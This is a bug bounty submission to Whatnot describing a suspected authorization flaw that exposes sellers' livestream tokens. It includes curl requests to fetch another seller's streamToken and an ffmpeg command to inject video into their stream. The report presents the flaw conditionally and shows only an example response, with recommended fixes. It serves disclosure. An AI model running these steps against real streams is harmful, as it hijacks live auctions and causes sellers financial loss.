# HackerOne Submission — Stream Token Disclosure Enables Livestream Hijacking

**Program:** Whatnot  
**Weakness:** IDOR — Broken Object Level Authorization  
**Severity:** High  
**Asset:** api.whatnot.com  

---

## Summary

The Whatnot GraphQL `live(id:)` query returns a `streamToken` field in its response. This token authenticates the broadcaster's ingest connection (RTMP/WebRTC) and should only be visible to the seller who owns the livestream. If the field is returned for any authenticated user querying another user's live stream ID, an attacker can obtain the stream token and use it to interrupt or hijack an active seller's livestream — causing financial harm during a live auction.

---

## Steps to Reproduce

> **Setup required:** Two Whatnot seller accounts. Account B must start an active livestream.

### Step 1 — Get a livestream ID

As Account A (attacker), search for any active livestream on Whatnot. The stream ID is visible in the URL when viewing a stream:

```
https://www.whatnot.com/live/STREAM_ID_HERE
```

Or query active streams:

```bash
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_<ACCOUNT_A_TOKEN>" \
  -H "Content-Type: application/json" \
  -H "X-Whatnot-App: whatnot-web" \
  -d '{"query": "{ livestreams(status: \"playing\", first: 5) { edges { node { id title user { username } } } } }"}'
```

Note a stream ID that belongs to Account B (not Account A).

---

### Step 2 — Fetch the stream token as Account A

```bash
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_<ACCOUNT_A_TOKEN>" \
  -H "Content-Type: application/json" \
  -H "Apollographql-Client-Name: web" \
  -H "X-Whatnot-App: whatnot-web" \
  -d '{
    "query": "query GetLive($id: ID!) { live(id: $id) { id status title streamToken viewerCount user { id username } } }",
    "variables": { "id": "ACCOUNT_B_STREAM_ID" }
  }'
```

---

### Step 3 — Verify vulnerability

If the response contains a non-null `streamToken` for Account B's stream (while authenticated as Account A), the vulnerability is confirmed.

Example vulnerable response:
```json
{
  "data": {
    "live": {
      "id": "ACCOUNT_B_STREAM_ID",
      "status": "playing",
      "title": "Rare Cards Live Auction!",
      "streamToken": "eyJhbGciOi...<token>",
      "viewerCount": 342,
      "user": { "id": "ACCOUNT_B_ID", "username": "seller_bob" }
    }
  }
}
```

---

### Step 4 — Demonstrate impact (proof of concept — do not disrupt real sellers)

With the `streamToken`, the attacker can connect to Whatnot's streaming ingest server using standard RTMP tooling. This would allow interrupting or replacing the video feed. **Only demonstrate this on your own Account B test stream, never on real seller streams.**

```bash
# Proof of concept only — use your own test stream
ffmpeg -re -i test_video.mp4 \
  -c:v libx264 -c:a aac \
  -f flv "rtmps://ingest.whatnot.com/live/<streamToken>"
```

Include a screenshot of the stream token value in your response body instead of actually connecting to another user's stream.

---

## Expected Result

`streamToken` should be `null` (or field should be absent) when Account A queries Account B's stream.

## Actual Result (if vulnerable)

A valid `streamToken` is returned, enabling stream takeover.

---

## Impact

- Attacker can interrupt live auctions mid-sale, causing financial losses to sellers
- Fraudulent video content could be injected into a stream with hundreds of active viewers/bidders
- Platform integrity of live auctions is undermined
- High-profile sellers (with 10k+ viewers) are especially high-value targets

---

## Recommended Fix

- In the `live(id:)` resolver, only return `streamToken` when `current_user.id == live.seller_id`
- Strip `streamToken` from the response object for all non-owner queries at the resolver level
- Rotate stream tokens periodically and validate ingest IP against seller's expected geolocation
